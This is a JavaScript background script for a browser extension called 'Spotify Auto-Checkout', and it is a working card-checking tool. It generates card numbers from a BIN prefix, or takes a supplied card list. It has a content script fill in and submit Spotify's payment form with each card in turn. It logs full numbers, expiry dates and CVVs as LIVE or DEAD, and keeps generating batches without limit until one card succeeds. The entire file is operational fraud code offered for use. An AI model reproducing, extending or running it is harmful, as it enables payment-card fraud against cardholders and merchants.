// Background service worker - Spotify Auto-Checkout Extension
'use strict';

importScripts('cardGenerator.js');

const DEFAULT_SETTINGS = {
    bin: '',
    quantity: 10,
    cardType: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    fillDelay: 300,
    loopDelay: 2000
};

async function getSettings() {
    return new Promise(resolve => {
        chrome.storage.local.get(['spSettings'], r => {
            resolve({ ...DEFAULT_SETTINGS, ...(r.spSettings || {}) });
        });
    });
}

async function saveSettings(settings) {
    return new Promise(resolve => {
        chrome.storage.local.set({ spSettings: settings }, () => resolve(settings));
    });
}

// ── State shared with popup ──
let loopTimeout = null;
let runnerState = {
    running: false,
    tabId: null,
    cards: [],      // CardObject[]
    index: 0,
    stats: { tried: 0, died: 0, live: 0 }
};

// Runner control channel
const MESSAGE_HANDLERS = {
    getSettings: () => getSettings(),
    saveSettings: ({ settings }) => saveSettings(settings),

    startRunner: async (request) => {
        if (runnerState.running) return { success: false, error: 'Already running' };
        const settings = await getSettings();

        let cards = [];
        let isManual = false;

        if (request.cardList && request.cardList.length) {
            isManual = true;
            cards = request.cardList
                .map(s => {
                    try { return CardGenerator.parseCardData(s.trim()); } catch { return null; }
                })
                .filter(Boolean);
        } else {
            const bin = (request.bin || settings.bin || '').replace(/\D/g, '');
            if (!bin) return { success: false, error: 'BIN is required' };

            // Initial batch
            cards = CardGenerator.generateMultipleCardDetails(bin, 10, {
                month: request.month || settings.expiryMonth || null,
                year: request.year || settings.expiryYear || null,
                cvv: request.cvv || settings.cvv || null,
                cardType: request.cardType || settings.cardType || null
            });

            // Store options for "infinite" generation
            runnerState.binOptions = {
                bin,
                month: request.month || settings.expiryMonth || null,
                year: request.year || settings.expiryYear || null,
                cvv: request.cvv || settings.cvv || null,
                cardType: request.cardType || settings.cardType || null
            };
        }

        if (!cards.length) return { success: false, error: 'No cards generated' };

        runnerState = {
            ...runnerState,
            running: true,
            tabId: request.tabId,
            cards,
            index: 0,
            isManual,
            stats: { tried: 0, died: 0, live: 0 }
        };

        chrome.storage.local.set({ spState: { ...runnerState } });
        broadcastState();
        processNextCard();
        return { success: true, total: isManual ? cards.length : '∞' };
    },

    stopRunner: () => {
        runnerState.running = false;
        if (loopTimeout) {
            clearTimeout(loopTimeout);
            loopTimeout = null;
        }
        if (runnerState.tabId) {
            chrome.tabs.sendMessage(runnerState.tabId, { action: 'stopExecution' }).catch(() => { });
        }
        broadcastState();
        return { success: true };
    },

    cardResult: (request) => {
        if (!runnerState.running) return { success: true };
        const { result } = request;
        const card = runnerState.cards[runnerState.index];

        runnerState.stats.tried++;
        if (result === 'live') {
            runnerState.stats.live++;
            const entry = formatCardLog(card, '✅ LIVE');
            pushLog({ type: 'live', icon: '✅', msg: entry, num: card?.number });
            runnerState.running = false;
        } else {
            runnerState.stats.died++;
            const entry = formatCardLog(card, '❌ DEAD');
            pushLog({ type: 'dead', icon: '❌', msg: entry, num: card?.number });
        }

        broadcastState();

        if (!runnerState.running) {
            // If live or stopped, don't schedule next
            if (loopTimeout) { clearTimeout(loopTimeout); loopTimeout = null; }
            return { success: true };
        }

        // Handle "infinite" generation for BIN mode
        if (!runnerState.isManual && (runnerState.index + 1) >= runnerState.cards.length) {
            const more = CardGenerator.generateMultipleCardDetails(
                runnerState.binOptions.bin, 10, runnerState.binOptions
            );
            // Deduplicate against existing cards
            const existingNums = new Set(runnerState.cards.map(c => c.number));
            const uniqueMore = more.filter(c => !existingNums.has(c.number));
            runnerState.cards = [...runnerState.cards, ...uniqueMore];
        }

        runnerState.index++;
        if (runnerState.index >= runnerState.cards.length) {
            pushLog({ type: 'info', icon: '🏁', msg: `All cards exhausted.` });
            runnerState.running = false;
            broadcastState();
            return { success: true };
        }

        const delay = request.loopDelay ?? 2000;
        if (loopTimeout) clearTimeout(loopTimeout);
        loopTimeout = setTimeout(() => processNextCard(), delay);
        return { success: true };
    },

    getState: () => ({ ...runnerState }),

    pushLog: (request) => {
        pushLog({ type: request.logType || 'info', icon: request.icon || '·', msg: request.msg });
        return { success: true };
    }
};

function formatCardLog(card, status) {
    if (!card) return status;
    return `${status} | ${card.number} | ${card.expiry?.formatted || '??/??'} | ${card.cvv || '???'} | ${card.type || 'Unknown'}`;
}

// Send next card to content script
function processNextCard() {
    if (!runnerState.running) return;
    const card = runnerState.cards[runnerState.index];
    if (!card) { runnerState.running = false; broadcastState(); return; }

    pushLog({ type: 'info', icon: '🔄', msg: `[${runnerState.index + 1}/${runnerState.cards.length}] Trying: ${card.number} | ${card.expiry?.formatted} | ${card.cvv}` });

    if (runnerState.tabId) {
        chrome.tabs.sendMessage(runnerState.tabId, {
            action: 'fillAndSubmit',
            cardData: card
        }, () => { /* ack optional */ });
    }
}

let logEntries = [];
function pushLog(entry) {
    logEntries.push({ ...entry, ts: Date.now() });
    if (logEntries.length > 300) logEntries = logEntries.slice(-300);
    chrome.storage.local.set({ spLog: logEntries });
    // broadcast to popup
    chrome.runtime.sendMessage({ action: 'logUpdate', entry }).catch(() => { });
}

function broadcastState() {
    const payload = {
        action: 'stateUpdate',
        running: runnerState.running,
        index: runnerState.index,
        total: runnerState.cards.length,
        stats: { ...runnerState.stats }
    };
    chrome.storage.local.set({ spState: payload });
    chrome.runtime.sendMessage(payload).catch(() => { });
}

// ── Message Listener ──
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    const action = request?.action;
    const handler = MESSAGE_HANDLERS[action];
    if (!handler) return false;

    Promise.resolve(handler(request, sender))
        .then(result => sendResponse(result))
        .catch(err => sendResponse({ success: false, error: err.message }));
    return true;
});

chrome.runtime.onInstalled.addListener(() => {
    console.log('Spotify Auto-Checkout Extension installed');
});
